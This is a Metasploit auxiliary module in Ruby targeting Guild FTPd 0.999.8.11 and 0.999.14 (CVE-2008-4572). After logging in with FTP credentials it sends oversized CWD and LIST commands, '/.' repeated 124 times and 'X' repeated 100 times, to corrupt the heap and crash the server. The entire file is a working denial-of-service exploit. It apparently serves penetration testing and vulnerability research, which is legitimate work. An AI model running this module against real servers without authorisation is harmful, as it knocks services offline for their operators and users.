##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Guild FTPd 0.999.8.11/0.999.14 Heap Corruption',
        'Description' => %q{
          Guild FTPd 0.999.8.11 and 0.999.14 are vulnerable
          to heap corruption.  You need to have a valid login
          so you can run CWD and LIST.
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-4572' ],
          [ 'OSVDB', '49045' ],
          [ 'EDB', '6738']
        ],
        'DisclosureDate' => '2008-10-12',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    # They're required
    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ], fallbacks: ['USERNAME']),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ], fallbacks: ['PASSWORD'])
    ])
  end

  def run
    return unless connect_login

    print_status('Sending commands...')

    # We want to try to wait for responses to these
    send_cmd(['CWD', '/.' * 124])
    send_cmd(['LIST', 'X' * 100])

    disconnect
  end
end
